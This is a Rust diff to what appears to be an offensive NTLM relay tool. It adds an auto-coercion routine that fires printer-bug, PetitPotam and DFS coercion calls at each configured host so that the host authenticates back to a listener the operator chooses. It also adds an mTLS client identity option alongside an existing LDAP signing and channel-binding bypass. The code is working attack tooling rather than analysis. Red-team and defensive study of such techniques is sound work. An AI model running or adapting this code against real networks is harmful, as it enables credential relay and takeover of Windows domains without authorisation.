@@ -20,8 +20,9 @@ pub use smb_daemon::{SmbDaemon, SmbDaemonConfig, SmbDaemonMode};
 // Re-export RelayError from overthrone_core
 pub use overthrone_core::error::RelayError;
 use overthrone_core::error::Result;
+use overthrone_core::proto::{trigger_dfs_coerce, trigger_petitpotam, trigger_printer_bug};
 use std::net::SocketAddr;
-use tracing::info;
+use tracing::{info, warn};
 
 /// Protocol for relay targets
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -162,6 +163,15 @@ pub struct RelayControllerConfig {
     /// Strips SIGN/SEAL/ALWAYS_SIGN flags and channel bindings from
     /// NTLM challenge/authenticate during LDAP/LDAPS relay.
     pub ldap_signing_bypass: bool,
+    /// Optional mTLS client identity for outbound TLS connections.
+    pub tls_client_identity: Option<crate::relay::TlsIdentity>,
+    /// Hosts to automatically coerce into authenticating to this relay.
+    /// Each host will be targeted with printer-bug, petitpotam, and DFS coercion.
+    pub auto_coerce_targets: Vec<String>,
+    /// IP address that coerced targets should connect back to.
+    /// Typically the relay's own IP on the target network.
+    /// Required when `auto_coerce_targets` is non-empty.
+    pub auto_coerce_listener: Option<String>,
 }
 
 impl Default for RelayControllerConfig {
@@ -179,6 +189,9 @@ impl Default for RelayControllerConfig {
             downgrade_auth: false,
             no_poison: false,
             ldap_signing_bypass: true,
+            tls_client_identity: None,
+            auto_coerce_targets: Vec::new(),
+            auto_coerce_listener: None,
         }
     }
 }
@@ -255,6 +268,7 @@ impl RelayController {
                 ldap_signing_bypass: self.config.ldap_signing_bypass,
                 max_retries: 3,
                 max_connections: 64,
+                tls_client_identity: self.config.tls_client_identity.clone(),
             };
             self.relay = Some(relay::NtlmRelay::new(relay_config));
             info!(
@@ -291,7 +305,54 @@ impl RelayController {
         }
 
         info!("All services started successfully");
+
+        // Auto-trigger coercion against specified targets
+        if !self.config.auto_coerce_targets.is_empty() {
+            self.auto_coerce().await;
+        }
+
         Ok(())
+    }
+
+    /// Automatically trigger coercion against configured targets.
+    /// Runs all three techniques (printer-bug, petitpotam, DFS) against each target.
+    async fn auto_coerce(&self) {
+        let listener = match &self.config.auto_coerce_listener {
+            Some(ip) => format!(r"\\{}\coerce", ip),
+            None => {
+                warn!("auto_coerce_targets is set but no auto_coerce_listener — skipping coercion");
+                return;
+            }
+        };
+
+        info!(
+            "Auto-coercing {} target(s) to connect back to {}",
+            self.config.auto_coerce_targets.len(),
+            listener
+        );
+
+        for target in &self.config.auto_coerce_targets {
+            info!("Coercing {}", target);
+            for technique in &["printer-bug", "petitpotam", "dfs-coerce"] {
+                let result = match *technique {
+                    "printer-bug" => trigger_printer_bug(target, &listener).await,
+                    "petitpotam" => trigger_petitpotam(target, &listener).await,
+                    "dfs-coerce" => trigger_dfs_coerce(target, &listener).await,
+                    _ => unreachable!(),
+                };
+                match result {
+                    Ok(r) if r.success => {
+                        info!("[{}] {} succeeded", target, technique);
+                    }
+                    Ok(r) => {
+                        warn!("[{}] {} failed: {}", target, technique, r.message);
+                    }
+                    Err(e) => {
+                        warn!("[{}] {} error: {}", target, technique, e);
+                    }
+                }
+            }
+        }
     }
 
     /// Stop all services
@@ -352,6 +413,9 @@ pub async fn run_responder(interface: &str, challenge: Option<&str>) -> Result<R
         downgrade_auth: false,
         no_poison: false,
         ldap_signing_bypass: true,
+        tls_client_identity: None,
+        auto_coerce_targets: Vec::new(),
+        auto_coerce_listener: None,
     };
 
     let mut controller = RelayController::new(config);
@@ -380,6 +444,9 @@ pub async fn run_relay_attack(
         downgrade_auth: false,
         no_poison: false,
         ldap_signing_bypass: true,
+        tls_client_identity: None,
+        auto_coerce_targets: Vec::new(),
+        auto_coerce_listener: None,
     };
 
     let mut controller = RelayController::new(config);
